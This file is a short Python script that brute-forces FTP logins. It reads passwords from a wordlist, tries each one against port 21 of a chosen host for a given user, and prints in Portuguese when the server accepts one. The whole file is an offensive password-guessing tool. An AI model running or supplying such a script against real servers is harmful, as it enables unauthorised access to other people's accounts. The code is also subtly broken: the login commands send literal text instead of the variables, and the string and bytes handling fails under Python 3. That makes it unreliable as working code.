import socket
import sys
import re
import time
import os
from tkinter import E

# python bf.py host username
if len(sys.argv) < 3:
    print("Use: python bf.py + host + username")
    sys.exit()

server = sys.argv[1]
user = sys.argv[2]

file = open("lista.txt")
for key in file.readlines():
    print("Testando\nUser: %s\nPass:%s"%(user, key))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, 21))
    s.recv(1024)
    s.send("USER '+user+'\r\n'")
    s.recv(1024)
    s.send("PASS '+key+'\r\n")
    res = s.recv(1024)
    s.send("QUIT")

    if re.search("230", res):
        print("Senha encontrada! :)\n >> %s"%(key))
        break
    else:
        print("Acesso negado")
        time.sleep(3)
        os.system('clear')



